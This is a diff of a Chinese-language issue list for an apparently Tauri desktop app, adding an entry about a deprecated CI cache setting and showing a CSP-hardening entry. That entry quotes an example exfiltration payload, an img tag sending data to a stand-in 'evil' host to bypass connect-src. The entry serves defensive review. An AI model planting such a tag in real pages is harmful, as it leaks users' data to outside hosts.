@@ -68,6 +68,11 @@
 - **路径:** fileService（`saveFileAs` 二次写入）、wordExportService（writeFile）、wechatPreviewService（writeTextFile/save+readTextFile）、htmlPresentationService（readLocalResource）四处调用面改走受控 Rust 命令（扩展名白名单 + 黑名单复用），然后从 capabilities 删除 4 条 fs allow-*。
 - **注意:** 迁移前后须真机回归全部涉盘流程（NOT_VERIFIED 清单见 CHANGELOG ISS-197 条目）。
 
+#### ⬜ ISS-213 release.yml 的 rust-cache workdir 同款失效（ISS-212 review 顺带发现,2026-08-29）
+
+- **发现:** release.yml:40-42 的 `Swatinem/rust-cache@v2` 仍用已废弃的 `workdir` 输入,同 ci.yml MAJOR-1——缓存 key 退化为空串哈希、路径错位,release 构建每次全量冷编译拖慢发版。
+- **建议:** 改 `workspaces: src-tauri`,与 ci.yml 修复同构。
+
 #### ⬜ ISS-202 CSP 收紧评估：摘 unsafe-eval + img-src 外泄通道收敛
 
 - **发现:** `tauri.conf.json:31` script-src 同时含 `'unsafe-eval' 'unsafe-inline'`，CSP 对 XSS 失去第二道拦截价值，DOMPurify 白名单成为唯一防线；`img-src http: https:` 是现成数据外泄通道（`<img src="https://evil/?d=...">` 绕过 `connect-src 'self'`）。img-src 的放开是 ISS-110/ISS-178 有意为之（外部图床图片加载），需产品层面权衡。
